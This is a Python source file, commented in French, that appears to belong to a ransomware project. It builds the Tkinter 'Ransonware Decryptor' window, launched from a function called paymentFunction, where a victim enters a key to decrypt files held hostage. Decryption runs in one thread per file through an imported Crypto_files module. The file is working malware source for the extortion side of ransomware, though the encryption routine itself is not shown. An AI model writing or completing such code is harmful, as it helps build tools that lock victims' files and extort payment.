# Import :
from tkinter import *
from tkinter.messagebox import *
from functools import partial
import threading
import Crypto_files


# Variable
main_thread = threading.currentThread()

# Fonction de déchiffrement
def decrypt(clé, chemin):
    # Récupération de la clé
    if clé.get():
        # transformation du type de la clé
        key = bytes(clé.get().encode())
        # Message de confirmation avant le démarrage du processus de déchiffrement
        if askyesno("Titre 1", "Êtes-vous sûr de vouloir faire ça ?"
                               "\nAvant toutes manipulations, assurez-vous d'avoir la bonne clé"
                               "\nUne mauvaise clé ne fera qu'empirer les choses"
                               "\nVous êtes prévenu !"):
            # Retourne une liste des fichiers chiffrés et de leurs chemins
            liste_des_fichiers_chiffrés = Crypto_files.listFiles(chemin)
            # Variable de débugging (à retirer plus tard)
            j = 1
            # Loop à travers ces fichiers
            for fichier_chiffré in liste_des_fichiers_chiffrés:
                # Print de débugging (à retirer)
                print("starting thread n°:" + str(j))
                # Crée un thread par fichier pour accélérer le processus de déchiffrement
                threading.Thread(target=Crypto_files.decryptionFunction, args=(key, fichier_chiffré)).start()
                # Print de débugging (à retirer)
                print(threading.enumerate())
                # Print de débugging (à retirer)
                print("Finishing thread n°:" + str(j))
                j += 1
            # On s'assure que tous les thread sont terminés
            for thread in threading.enumerate():
                if thread is not main_thread:
                    thread.join()
            # Message de fin
            showinfo('Titre 1', 'Déchiffrement terminé !')
        else:
            # Annulation du processus de déchiffrement
            showinfo('Titre 1', 'Annulation...')
    else:
        # Message d'erreur si la clé est vide
        showinfo('Titre 1', 'Veuillez, entrer une clé de déchiffrement !')


def paymentFunction(chemin):
    """ Interface graphique permettant de rentrer la clés de déchiffrement
    """
    # Création de la fenêtre
    fenetre = Tk()
    # Ajout d'un titre
    fenetre.title('Ransonware Decryptor')
    # Chargement de l'icone
    fenetre.iconbitmap("icone.ico")

    # largeur et hauteur de la fenêtre
    l = 365
    h = 25

    # largeur et hauteur de la fenêtre
    largeur = fenetre.winfo_screenwidth()
    hauteur = fenetre.winfo_screenheight()

    # Calcul des coordonnés de x et y pour la fenêtre principale
    x = (largeur / 2) - (l / 2)
    y = (hauteur / 2) - (h / 2)

    # Positionnement de la fenêtre
    fenetre.geometry('%dx%d+%d+%d' % (l, h, x, y))

    # Création de l'objet hébergeant le champs pour la clé
    clé = Entry(fenetre, width=50)
    # Ajout de cet objet dans la fenêtre
    clé.grid(row=0, column=0)
    # Focus sur l'objet
    clé.focus_set()
    # Création d'un bouton
    bouton = Button(fenetre, text="déchiffrer", command=partial(decrypt, clé, chemin))
    # Ajout du bouton dans la fenêtre
    bouton.grid(row=0, column=1)
    # Affichage de l'interface graphique
    fenetre.mainloop()
